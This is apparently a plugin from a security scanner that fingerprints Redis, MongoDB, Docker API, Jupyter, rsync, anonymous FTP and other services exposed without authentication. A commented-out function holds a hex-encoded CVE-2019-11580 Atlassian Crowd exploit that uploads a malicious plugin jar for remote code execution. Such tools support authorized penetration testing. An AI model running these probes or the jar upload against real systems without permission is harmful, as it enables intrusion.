# !/usr/bin/env python3
# -*- coding: utf-8 -*-
# description: 未授权测试
# 可参考文章 https://xz.aliyun.com/t/6103

import threading
import socket
from lib.core.Request import request
from plugin.target_parse import get_standard_url, url2ip
import re
import binascii
from ftplib import FTP
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def redis(host, result, ports=[6379]):
    """
    :param host: 目标host
    :param ports: 目标端口，列表形式 (可选)
    :return: 结果，列表形式
    """
    socket.setdefaulttimeout(3)
    payload = '\x2a\x31\x0d\x0a\x24\x34\x0d\x0a\x69\x6e\x66\x6f\x0d\x0a'
    for port in ports:
        try:
            s = socket.socket()
            s.connect((host, port))  # 未开放端口会引发ConnectionRefusedError异常
            s.send(payload.encode('utf-8'))
            recv_data = s.recv(1024)  # 未开redis则引发socket.timeout异常
            s.close()
            if recv_data and b'redis_version' in recv_data:
                result.append(f"redis: {host}:{port}")
        except:
            pass
    


def mongo(host, result, ports=[27017]):
    """
    :param host:目标host
    :param ports: 目标端口，列表形式 (可选)
    :return: 列表形式的结果，比如[] 或者 ['mongodb: 112.25.75.181:27017']
    """
    socket.setdefaulttimeout(3)
    payload = binascii.a2b_hex(
        "430000000300000000000000d40700000000000061646d696e2e24636d640000000000ffffffff1c000000016c69737444617461626173657300000000000000f03f00")
    for port in ports:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, port))
            s.send(payload)
            recv_data = s.recv(500)
            if "databases".encode('utf-8') in recv_data:
                result.append(f"mongodb: {host}:{port}")
        except:
            pass


def genkins(host, result, ports=[8080]):
    for port in ports:
        try:
            payload = f"http://{host}:{port}/manage"
            r = request.get(payload, timeout=5, allow_redirects=False, verify=False)
            if "genkins" in r.text:
                result.append(f"genkins: {payload}")
        except:
            pass


def memcached(host, result, ports=[11211]):
    socket.setdefaulttimeout(3)
    for port in ports:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, port))
            s.send("stats\r\n".encode())
            recv_data = s.recv(1024)
            s.close()
            if recv_data and b"STAT version" in recv_data:
                result.append(f"memcached: {host}:{port}")
        except:
            pass


def jboss(host, result, ports=[8080]):
    for port in ports:
        try:
            payload = f"http://{host}:{port}/jmx-console/"
            r = request.get(payload, timeout=5, allow_redirects=False, verify=False)
            if "jboss" in r.text:
                result.append(f"jboss: {payload}")
        except:
            pass


def zookeeper(host, result, ports=[2181]):
    socket.setdefaulttimeout(3)
    for port in ports:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, port))
            s.send("envi".encode())
            recv_data = s.recv(1024)
            s.close()
            if b'Environment' in recv_data:
                result.append(f"zookeeper: {host}:{port}")
        except:
            pass


def rsync(host, result, ports=[873]):
    # 代码参考https://raw.githubusercontent.com/ysrc/xunfeng/master/vulscan/vuldb/rsync_weak_auth.py
    def _rsync_init(host, port):
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        socket.setdefaulttimeout(3)
        s.connect((host, port))
        s.send("@RSYNCD: 31\n".encode())
        _ = s.recv(1024)
        return s

    for port in ports:
        try:
            # 获取目录
            s = _rsync_init(host, port)
            s.send(bytes.fromhex('0a'))
            recv_data = s.recv(1024)
            s.close()
            paths = []
            if recv_data:
                for path_name in re.split('\n', recv_data.decode()):
                    if path_name and not path_name.startswith('@RSYNCD: '):
                        paths.append(path_name.split('\t')[0].strip())
            # print(f"获取目录字节-----{recv_data}")
            # print(f"获取到的目录为-----------{paths}")

            # 尝试看下是否可以未授权访问
            for path in paths:
                s = _rsync_init(host, port)
                s.send(f"{path}\n".encode())
                recv_data = s.recv(1024)
                # print(f"尝试未授权访问接受的字节-----------{recv_data}")

                if recv_data.decode() == '\n':
                    recv_data = s.recv(1024)
                # 以下说明是未授权访问
                if recv_data.decode().startswith('@RSYNCD: OK'):
                    result.append(f"rsync: {host}:{port}/{path}")
                s.close()

        except:
            pass

# def atlassian_crowd(host, ports=[8095]):
#     # CVE-2019-11580
#     # 代码来自https://github.com/jas502n/CVE-2019-11580
#     # data decode还有点问题
#     result = []
#
#     for port in ports:
#         try:
#             upload_url = f"http://{host}:{port}/crowd/admin/uploadplugin.action"
#             r = request.get(upload_url, timeout=5, allow_redirects=False, verify=False)
#             if r.status_code == 400:
#                 url_vuln = f"http://{host}:{port}/crowd/admin/uploadplugin.action"
#                 headers = {
#                     'User-Agent': 'curl/7.29.0',
#                     'Accept': '*/*',
#                     'Content-Length': '5739',
#                     'Expect': '100-continue',
#                     'Content-Type': 'multipart/mixed; boundary=----------------------------f15fe87e95a7'
#                 }
#                 s = "2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d6631356665383765393561370d0a436f6e74656e742d446973706f736974696f6e3a20666f726d2d646174613b206e616d653d2266696c655f63646c223b2066696c656e616d653d227263652e6a6172220d0a436f6e74656e742d547970653a206170706c69636174696f6e2f6f637465742d73747265616d0d0a0d0a504b03041400000008007c7ef14e544c2527eb0000000402000014001c0061746c61737369616e2d706c7567696e2e786d6c55540900039bd32e5da8d32e5d75780b0001040000000004000000007d91416ec3201045d7ce29107b20c91a23e50039c4044f53140c16e0a8bd7d260527ae5595dd7c66febc0f1a8a879c1d0431f9f9ea02bbe177cf6d1ca51dbccc9fe8bdc4af89b30023f6fcb4b4b33304b862e2acce6571c7945d0c3d3f72669f5d7fd9981da3a3eb8c70e12356a5aa90606c8bde5c0314101643c124c87082e22e1eb9296946ad7e66561e03669bdc5488c46c61473269b85aad1bdfe32d8439c8bddc6bb594955afdc2de753a63ba7b2c0d99f2f9e80aaf4ff8aafe798beee93a272f2814c50b4691aed55aa93d6bd80bd8db106362505823caaa9128dab089d6e9e59290b5dafe37890f504b03040a00000000001b7ff14e00000000000000000000000004001c00636f6d2f5554090003c6d42e5dc9d42e5d75780b000104000000000400000000504b03040a00000000001b7ff14e00000000000000000000000008001c00636f6d2f63646c2f5554090003c6d42e5dc9d42e5d75780b000104000000000400000000504b03040a0000000000d07df14e0000000000000000000000000e001c00636f6d2f63646c2f7368656c6c2f555409000357d22e5d59d22e5d75780b000104000000000400000000504b03041400000008008878f14ec2481cb07d0100008d03000016001c00636f6d2f63646c2f7368656c6c2f43646c2e6a61766155540900036fc82e5dbdc82e5d75780b0001040000000004000000008d934d4fc3300c86effd15a617523e22384f3d21049c400c890b97909a35903621714711da7fc75187e8b60ee14395da799fbcb15baff49b5a2068d7485d59196bb4769665a6f12e10bcaaa5ea65c4b0b448b226f2f268362e4ae3e44deb3b9a5340d5b0d277cfd668d056c508179505ec09db2a4eb1aef9311f12f09565c0b1962f9da9a072574862b4e91edf3b8c0401df4f60231fbd6b237221164c827550f81cbda5609ba65d806eaa7258caa5b21ddebe0866ca05d29d0aaa41c220f28ba6ca8b6236a5771df19dcb3cdfacee9e97c2bc8038e01325bb57368a9ca913db52dc05a791fbe6cbfbae25d360b2b45e8a42628f5a3069cbd44f8c06911c963ea94749f10f1d8630e82e4370e16f9d69097479f87476385dffa88d45104297ec4632a9127cf383124ecff73520050f3119780c268da1901f69c1945a8542efb1b2dac96e6656a015e95a5cf61a3d19d7f26739e56118ec71993fb5f931f692dc30f1ed16fcd227c8db60949e19dc61fed91e82d238a60da45596adb26f504b030414000000080085b2f04ecafaf82fe50000000418000017001c00636f6d2f63646c2f7368656c6c2f2e44535f53746f726555540900031add2d5d09df2d5d75780b000104000000000400000000ed98316ec2401045ff382e564ab365ca2da922e5062b0305752e100815b2e42aa95d71176ec1cdc0667e0292b1945444e13f69f40acf8cd7cdee8e0158f5b17e0122800037b6b84a600c2868f3e87a6cb0c427968bba79bfde6b809d9a4fb1468de7cbfa55ddacb8b05d1793c3891f7615420821c418e60a8fb75d8610e20fd2ef0f89ce74eb363e2fe8f2a226d289ce74eb36e6157449073ad289ce74ebe6a6651c3e8c6f364e2816e944e75f7db21077c3832bf6e7ff1ca3f3bf10e21f63e5ec7556e17b2018d09fb5a98b37e6ecbf0a472e0285ff307cc2392fd1996eddba0c08710b8e504b0304140000000800b178f14ed0054a4648030000fa05000017001c00636f6d2f63646c2f7368656c6c2f43646c2e636c6173735554090003bdc82e5d09df2d5d75780b0001040000000004000000008d545d7b1345147e274d32dbedf62ba594fa010202295016152b2608d852a05ad2d214b0f8b9dd8c6571b39b6e26b5fa33bcf4c6cb5e7313409fc71fe02ff12f78637d674925ad7da479f63967e6cc39ef79cf999cf9e3ef5f7f077009be8d31142d4cf4e12cced9388f490b178c766d5cc43b46bc6be33d5c32e27d1b53f8a00f97f1a18d12ca1257243eb23188a211572d5cb33180eb6673ddac3e9698969811c85f09a2405f15e8294edc17c8cec4352530381f44aad2aaafaa64d95b0d69c9d5e25b4a0b2c15e71f7b1bdea6db54c946a8b4fb48eb867b9ba2fac2b0a4d65baaa9cbaf746b36e2a8a9ca266b7f557bfe7777bc469a2ca576436256e2a6c42d89db2c47c0aec6adc457370343c79aa985174c060747304ef633f51a831ccce1138639f814f302707007158905078bb8eb600955023a58c63d07f7718fd00e1ee033e672b08287129f3bf8025f0a8c186c37f4a2357776d3570d1dc491c0d84b6b552741b436dd0ac29a4a1c7c85af0584ede01b90d2aaa134ecc775d7af856ef3910a439784058efe7f53044e1da8b902a70fd65d81a1bd9449eca56931897dd56ceed41bc4ee5cd468697a2aaf2ee0ac29bde8255e5d699530e98bbbef462b4ffcd7242037bcb0a516bedd13b2b0fa58f97aff903c2bf3423219dd2fe2e12ed64bad480775166793dfbf9bd1623770c74ce4acda54bec0995790efb482010344ddd586b11de4ddfde9b8ce26499cecb866a96ae930cd09f4f2f44112a4bdebc65864f2ce41b9abf55d66cedbf76641c0e29c9990bcd768a888c89307ba83ceff92e8968e77eefd5071dfce0f364cde74029713cf57388ec37c7bcc2f0361c68bf235eedea4e64c2177f629c4132e045ea7cca74623df485de82a8a0ceda5f5c77385cc73f464f00cd94a2157ca4e16726de47fc6e56790936d58a5dc380dbda5bc517649f64c59e3f936fa56a6accc2f289c7f0e87376bfdd446ffd6f69f5b3859cafd86c195a7181acfb6315c285098d011ea360e95b25bb02a041e7d420643a8e02e1f3b601d9a3a93f29da61db0f936f471d5cff2067082efe204771731ccd7b4806b1861ec11461f4695cd5867a4a6678bd5fdc03a8f12e106f2db74ee953826f196c4718913e97752e26d7eecca36dd737bce615eb7537fe1985159f6eb74dae833ff00504b030414000000080080b2f04e5e4c2ce8970100000418000011001c00636f6d2f63646c2f2e44535f53746f726555540900030fdd2d5dc8c82e5d75780b000104000000000400000000ed98cf4e833018c0bf32a61063e460e28e5c4c3cecb0c5cd1d8c09c179d8cd04a387693618c491205d06932862780d7d239fc0c751fe7c1ad0ede06953fb4b9a5f295f5b0aa4a500005167661340020001727322cc45c0f40d0ecd2789646d383d878e0c871af35b62ac1ce9b3ab820763b0c0293dbff495384cd2de5b46165d8834026f82912fc6c4b13dbfd178255c85afaead0ba228889be29536a681e6ebfecc53f5693f3d3ad5fdb181f9334a9dcfbc6e9cdb563090b68fa9ebebb66b4db3cab66925219717b66bd240a533d7f4fa8513594703a91686ad76bb2eb7daada82e879d4e23c9ef1f449128ecec368f7ac39bbbfbf0217a7ccac74c080e7eebcbcd782e0fd1f4468e915c242917df6a53d7a1ee35646f3d83c160fc4270f61236967b190c06630549e70719ada0e3dc04cf7368be504742cb68051de72618c7a179b48096d0325a41c7b971d222b8f920d833c11d0a91d0325af9d190198c7f43259794aeff278bf7ff0c06e30f43f8aed65561f1ef8c74ad959334fca800e50f012ce331365d8a6b857219ada0e3dcec4380c15816ef504b030414000000080080b2f04e7261dc5f94010000041800000d001c00636f6d2f2e44535f53746f726555540900030fdd2d5dc8c82e5d75780b000104000000000400000000ed98cf4e833018c0bf32548831723071472e261e76d8e2e60ec684e03cec6632a3876936188b2341ba0c2651c4f01afa463e818fa3fcf9749bba83a7e9fc7e49f32be52b6d81b4140060fad8aa00280020416e41866f91307d41408b4962e93578cf74b8899723fe02e9b32b400f2c709aceccf33b48d2ee6b4616895166e00d31ead91c3ab6e797cb2f4c28882bab6b922c4bf2867cd91af0a0e51bfed8d38d513b3d3a31fc8189f953ce9d8fbc619ed9fda0a36c1d71d7376cb73fca2adb563f09b938b75d8b073a1fbb96d79e3a9135d4518a6158add54a6ab5568d4a6a58af9793fcde7e14c9d2f64ee5b0d9bdbebd0befa387c77cac8ce1a0373fdd84a7c9f02cafe7984907d9a4e8a635721dee5e41f6961304412c01389b49eb8bed064110bf90747e50d11a3acecdf0bc8016a7ea286815ada1e3dc0ce304b48896d00a5a456be838374e5a0c371f0c5b66b84361b8f5602a5afbd19009e2df50c8a5a4ebfff1fcfd3f41104b0c131bad860ef37f6fa46bad9aa4ee7b0598fd10c0321163d3a5b83855aea235749c9b3e04086251bc01504b0304140000000800b57df14ef98bc46d88010000c303000016001c00636f6d2f63646c2f7368656c6c2f6578702e6a617661555409000326d22e5d57d22e5d75780b0001040000000004000000008d53c14ee33010bde72b865c702818f65cf98880130856e2c2c5eb0c8dc1898d3d2941abfe3b63d2d5a66d58ed93123933f39edf4ceca0cdab5e2118df4a533b991a746e5914b60d3e12bce8b51e64c2b87648b2210af264394d4aebe54d177a7aa088ba6566e87f396bc0389d12e010f821ecea34a775cdaf873100bf8b02185bfadadb1a6a7f85242645f7f8d6632288f8760a3bf1147c979013a96225d882e2c7e42b836dda6e05a6add5b8946bed7abc7d16ac295748773aea1609a328b9a8acaae51cdff7c43dabb2dccd9e9fb381acf2186d96a8e47b5e7c492946098bbcf59ee6a1cb0cfb0ce2888b25f7ac5d12257b9929cbb88bde204f3ba8fbbe23db62b6b05db2071cd088c36dff60f2fb725f2a64f62428fe8387318ebccb187dfc37cf7604461d3f5d1ccfe7df1beb1084308add4856aa05777ea4e0ecc77703c8989fbc308d8e95f9c6cae620ba1bd980d1641a7139180c647dc78779cec3781c16aa7ceaca050e92fc784ef647f0577d46795f1865600d9e305fd19f511b9caa8d4a9ba2d8149f504b03041400000008005a7ff14e3ac5f9ef48030000fa05000017001c00636f6d2f63646c2f7368656c6c2f6578702e636c61737355540900033bd52e5da8d32e5d75780b0001040000000004000000008d54db76d34614dde3d81e451171e2244ddd0b1428e00041bdd094da14682040dae084385c02f4a2c8d3202a4b8a2ca7693fa38f7de9639e793197aed50fe897f417fad2748f708a936641bcb4ce191d9db3cf3e7b3cf3e73fcfff007016ae8971940d4c0ce0244e99388d490367b4b74d7c800fb5f9c8c4c738abcd2726a6f0e900cee13313155425ce4b7c6ea280b236170c5c3431884bfae5925e7d21312d7159207fde0bbce482405f79e2b640f672d8500285392f50b5767345c54bce8acf48ae115e5389c06279ee91b3ee6cd82d15affb2ab11f2649645fa7a9bf082caab5b66a25d5d7a6b5a23068a9aaee7aa09e38ee0f379c286d9652bb2231237155e29ac4758e2360d6c376ecaaab9ea663a88de88cee60e14d94c8de6d36586461165fb2ccc257981380851ba849cc5b58c04d0b8ba813d0c2126e59b88d5b84b6700777d9cbc232ee49dcb7f0005f0b8c686cdb7782557b66c35551e28581c0f8cb683d89bd6075baedf90d155bf806df0a08d3c27720a5154d69d80d9bb6dbf0edd643e5fb36090b1c7cb52802c7f625aec0f1fda92b30b49b3289bd0c2dc4a1ab5aaded79bdd09e0da276c24ce53405ac55952c38b1d354898ad9f4c5def7a25527fe1f1290eb8edf56f3dfef2a995f79a4dc64ef923c27737c3219dbabe2de0ed68bed20f19a1cce24bfff5ec6cabdc0dd3091b36a43b902275e43be2b050b0689ba4386f16de49dfa745367e2388cb753b3748df430cd0af4f3eb9dd84bb5ebc55860f3ee876a8ff43d619eb71ff58280e5597d42f24e14a980c893fbda83eeff92e846126eeffb68794fe50b91ee9b9ec0a5d871150ee30dde3dfa9781d0c78bf62dbebd4bcf3385dcc927108fb910789b369f06b57d274d61aa28b3b49fd19f4f1533cfd097c153646bc55c253b59cc7590ff15e79e424e766054722506fa2b79edcc8aec9b324af90e0696a78ccc6f289e7e068b3b6bfcd2c181cdadbf3671b492fb1d85e527182a653b182e166974e9087d07a395ec268c1a81c71e93c1106ab8c9cb0e5843429f49f94e330e98bc1b06b81ae478051ce16a02c3bc538bbc4d477011a3ac2db17a1c754ab0c6d9124ed626c24f9cf22011ae20bfc5e47e894312ef491c9638923e4725dee74355b65892dbf51dfa763bf6370e6997a55ec753a14ffc0b504b01021e031400000008007c7ef14e544c2527eb00000004020000140018000000000001000000ed810000000061746c61737369616e2d706c7567696e2e786d6c55540500039bd32e5d75780b000104000000000400000000504b01021e030a00000000001b7ff14e000000000000000000000000040018000000000000001000ed4139010000636f6d2f5554050003c6d42e5d75780b000104000000000400000000504b01021e030a00000000001b7ff14e000000000000000000000000080018000000000000001000ed4177010000636f6d2f63646c2f5554050003c6d42e5d75780b000104000000000400000000504b01021e030a0000000000d07df14e0000000000000000000000000e0018000000000000001000ed41b9010000636f6d2f63646c2f7368656c6c2f555405000357d22e5d75780b000104000000000400000000504b01021e031400000008008878f14ec2481cb07d0100008d030000160018000000000001000000ed8101020000636f6d2f63646c2f7368656c6c2f43646c2e6a61766155540500036fc82e5d75780b000104000000000400000000504b01021e0314000000080085b2f04ecafaf82fe500000004180000170018000000000000000000a481ce030000636f6d2f63646c2f7368656c6c2f2e44535f53746f726555540500031add2d5d75780b000104000000000400000000504b01021e03140000000800b178f14ed0054a4648030000fa050000170018000000000000000000a48104050000636f6d2f63646c2f7368656c6c2f43646c2e636c6173735554050003bdc82e5d75780b000104000000000400000000504b01021e0314000000080080b2f04e5e4c2ce89701000004180000110018000000000000000000a4819d080000636f6d2f63646c2f2e44535f53746f726555540500030fdd2d5d75780b000104000000000400000000504b01021e0314000000080080b2f04e7261dc5f94010000041800000d0018000000000000000000a4817f0a0000636f6d2f2e44535f53746f726555540500030fdd2d5d75780b000104000000000400000000504b01021e03140000000800b57df14ef98bc46d88010000c3030000160018000000000001000000a4815a0c0000636f6d2f63646c2f7368656c6c2f6578702e6a617661555405000326d22e5d75780b000104000000000400000000504b01021e031400000008005a7ff14e3ac5f9ef48030000fa050000170018000000000000000000a481320e0000636f6d2f63646c2f7368656c6c2f6578702e636c61737355540500033bd52e5d75780b000104000000000400000000504b0506000000000b000b00bf030000cb11000000000d0a2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d6631356665383765393561372d2d0d0a"
#                 data = binascii.unhexlify(s)
#                 # print(data)
#                 r = request.post(url=url_vuln, headers=headers, data=data, timeout=5, verify=False)
#                 if r.status_code == 200 and "Installed" in r.text:
#                     result.append(f"atlassian crowd: {host}:{port}-->{r.content}")
#         except request.exceptions.ConnectionError:  # host没开/端口没开
#             pass
#         except:
#             pass
#     return result


def couchdb(host, result, ports=[5984]):
    for port in ports:
        try:
            url = f"http://{host}:{port}"
            r = request.get(url, timeout=5, allow_redirects=False, verify=False)
            if "couchdb" in r.text:
                result.append(f"couchdb: {host}:{port}")
        except:
            pass


def elasticsearch(host, result, ports=[9200]):
    for port in ports:
        try:
            r = request.get(f"http://{host}:{port}", timeout=5, allow_redirects=False, verify=False)
            if "elasticsearch" in r.text:
                result.append(f"elasticsearch: {host}:{port}")
        except:
            pass



def hadoop(host, result, ports=[8088]):
    for port in ports:
        try:
            r = request.get(f"http://{host}:{port}/cluster", timeout=5, allow_redirects=False, verify=False)
            if "Hadoop" in r.text:
                result.append(f"hadoop: {host}:{port}")
        except:
            pass


def jupyter(host, result, ports=[8888]):
    for port in ports:
        try:
            r = request.get(f"http://{host}:{port}", timeout=5, verify=False)
            if "clusters" in r.text:
                result.append(f"jupyter: {host}:{port}")
        except:
            pass



def docker(host, result, ports=[2375]):
    # exp: https://github.com/Tycx2ry/docker_api_vul
    for port in ports:
        try:
            r = request.get(f"http://{host}:{port}/version", timeout=5, verify=False)
            if "ApiVersion" in r.text:
                result.append(f"docker: {host}:{port}")
        except:
            pass
            
            
def ftp(host, result, ports=[21]):
    for port in ports:
        try:
            ftp = FTP()
            ftp.connect(host, port)
            ftp.login('anonymous', 'anonymous')
            result.append(f"ftp: {host}:{port}")
            ftp.quit()
        except:
            pass

def poc(host, ports=[]):
    host = get_standard_url(host)
    hosts = url2ip(host)
    result = []
    threads = []
    for host in hosts:
        if ports:
            args = (host, result, ports)
        else:
            args = (host, result,)
        poc_list = ['redis', 'mongo', 'genkins', 'memcached', 'jboss', 'zookeeper', 'rsync', 'couchdb', \
                    'elasticsearch', 'hadoop', 'jupyter', 'docker', 'ftp']
        for p in poc_list:
            threads.append(threading.Thread(target=globals()[p], args=args))

        for t in threads:
            t.start()
        for t in threads:
            t.join()
        return result





